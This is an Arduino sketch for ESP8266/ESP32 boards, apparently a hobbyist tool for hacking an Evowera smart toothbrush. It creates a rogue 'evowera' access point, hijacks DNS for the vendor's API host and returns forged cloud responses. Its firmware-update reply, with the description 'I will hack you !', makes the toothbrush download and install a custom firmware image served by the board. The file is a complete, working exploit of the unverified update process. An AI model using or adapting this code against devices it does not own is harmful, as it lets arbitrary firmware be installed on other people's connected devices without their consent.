#ifdef ESP8266
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
ESP8266WebServer webServer(8099);
#else
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
WebServer webServer(8099);
#endif

#include "CustomFW.h"

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;

String setDownload = "{\"code\":\"1\",\"data\":{\"address\":\"\",\"age\":1945,\"bracesArea\":\"\",\"brushHeadChangeTime\":0,\"brushHeadCode\":\"1945\",\"bv\":\"\",\"decayedArea\":\"\",\"defaultBrushingTime\":120,\"degree\":0,\"dym\":1,\"electric\":100,\"ev\":\"\",\"id\":3051,\"lang\":\"en\",\"location\":\"116.38,39.90\",\"musicMode\":0,\"musicStatus\":0,\"mv\":\"01.00.82\",\"n1\":1,\"newMessage\":1,\"nick\":\"\",\"positioningMode\":0,\"recessionArea\":\"\",\"reset\":1,\"rootCanalTherapy\":\"\",\"s1\":\"0000000000000000000000000000\",\"s2\":\"0000000000000000000000000000\",\"s3\":\"0000000000000000000000000000\",\"s4\":\"0000000000000000000000000000\",\"s5\":\"0000000000000000000000000000\",\"sensitiveArea\":\"\",\"setTime\":1708640153074,\"sn\":\"DC1L12345DCC0\",\"status\":1,\"strength\":\"\",\"themeBackground\":0,\"updateMode\":1,\"userHand\":1,\"userid\":\"\",\"vibrationDefaultMode\":0,\"wifiStatus\":0,\"yjs\":1},\"message\":\"success\",\"success\":true}";
String envLocation = "{\"code\":\"1\",\"success\":true,\"message\":\"success\",\"data\":{\"adm1\":\"Lower Saxony\",\"adm2\":\"Celle\",\"country\":\"Germany\",\"fxLink\":\"https:\/\/www.qweather.com\/weather\/wietze-89C49.html\",\"id\":\"89C49\",\"isDst\":\"0\",\"lat\":\"52.45200\",\"lon\":\"9.44100\",\"name\":\"Wietze\",\"rank\":\"77\",\"timestamp\":1708802276610,\"type\":\"city\",\"tz\":\"Europe\/Berlin\",\"utcOffset\":\"+01:00\"}}";
String setElectric = "{\"code\":\"1\",\"success\":true,\"message\":\"success\",\"data\":\"\"}";
String checkMaster = "{\"code\":\"1\",\"success\":true,\"message\":\"success\",\"data\":{\"describe\":\"I will hack you !\",\"mode\":\"1\",\"opt\":\"0\",\"type\":\"D\",\"url\":\"http:\/\/192.168.1.1:8099\/down.bin\",\"version\":\"01.00.85\"}}";
String ipSearch = "{\"INPUT_STRING\": \"0.0.0.0\", \"INPUT_IP_ADDRESS\": \"0.0.0.0\", \"CALLER_IP_ADDRESS\": \"12.12.12.12\", \"STATUS\": \"....................................\", \"ENTITY\": {\"INPUT_IP_ADDRESS\": {\"IP_ADDRESS\": \"0.0.0.0\", \"GLOBAL\": \"\", \"NATION\": \"......\", \"NATION_NAME_EN\": \"\", \"NATION_NAME_EN_ABBR\": \"\", \"PROVINCE\": \"\", \"CITY\": \"\", \"DISTRICT\": \"\", \"ISP\": \"\", \"ADCODE\": \"\", \"GPS\": \",\", \"STATUS\": \"....................................\"}, \"CALLER_IP_ADDRESS\": {\"IP_ADDRESS\": \"12.12.12.12\", \"GLOBAL\": \"......\", \"NATION\": \"......\", \"NATION_NAME_EN\": \"GERMANY\", \"NATION_NAME_EN_ABBR\": \"DE\", \"PROVINCE\": \"...............\", \"CITY\": \"\", \"DISTRICT\": \"\", \"ISP\": \"\", \"ADCODE\": \"\", \"GPS\": \"9.4376,52.4367\", \"STATUS\": \"....................................\"}}}";

void LEDlight()
{
  digitalWrite(5,HIGH);
  delay(10);
  digitalWrite(5,LOW);
}
void setup() {
  pinMode(5,OUTPUT);
  Serial.begin(115200);
  delay(1000);
  Serial.printf("Hello Toothbrush hackidy by ATC1441\r\n");
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP("evowera", "12345678");

  dnsServer.setTTL(300);
  dnsServer.setErrorReplyCode(DNSReplyCode::ServerFailure);
  dnsServer.start(DNS_PORT, "zh-api.evowera.com", apIP);

  webServer.on("/evo/api/device/set/download", []() {
    Serial.printf("Getting download Request\r\n");
    webServer.send(200, "application/json;charset=UTF-8", setDownload);
    LEDlight();
  });
  webServer.on("/evo/api/env/location", []() {
    Serial.printf("Getting Location Request\r\n");
    webServer.send(200, "application/json;charset=UTF-8", envLocation);
    LEDlight();
  });
  webServer.on("/evo/api/device/set/electric", []() {
    Serial.printf("Getting Electric Request\r\n");
    webServer.send(200, "application/json;charset=UTF-8", setElectric);
    LEDlight();
  });
  webServer.on("/evo/api/firmware/check/master", []() {
    Serial.printf("Getting Master Request\r\n");
    webServer.send(200, "application/json;charset=UTF-8", checkMaster);
    LEDlight();
  });
  webServer.on("/ip_addr_search/v1", []() {
    Serial.printf("Getting ipSearch Request\r\n");
    webServer.send(200, "application/json;charset=UTF-8", ipSearch);
    LEDlight();
  });
  webServer.on("/down.bin", []() {
    Serial.printf("Getting Download Request\r\n");
    webServer.send_P(200, "application/octet-stream", rawData,sizeof(rawData));
    LEDlight();
  });
  webServer.onNotFound([]() {
    webServer.send(200, "application/json;charset=UTF-8", "{}");
    LEDlight();
  });
  webServer.begin();
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}
